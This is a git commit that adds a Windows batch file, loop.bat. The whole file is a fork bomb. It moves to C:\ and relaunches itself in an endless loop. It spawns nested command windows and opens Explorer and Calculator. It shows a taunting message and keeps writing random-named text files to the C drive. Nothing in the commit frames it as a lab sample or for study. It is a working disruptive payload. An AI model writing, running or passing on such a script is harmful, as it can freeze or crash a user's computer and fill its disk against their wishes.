1349efe9d3961a3289812c9732621434b51de823
AmogusLeeway <86786324+AmogusLeeway@users.noreply.github.com>
2022-01-04 05:54:30 -0800

    Add files via upload

---
+++ loop.bat
@@ -0,0 +1,10 @@
+@echo off
+cd c:\
+:loop
+start loop.bat
+start cmd /c start cmd /c start cmd /c start cmd
+msg * nah fam i will explode your pc and spam the c drive with txt files
+start explorer
+calc
+echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%.txt
+goto loop
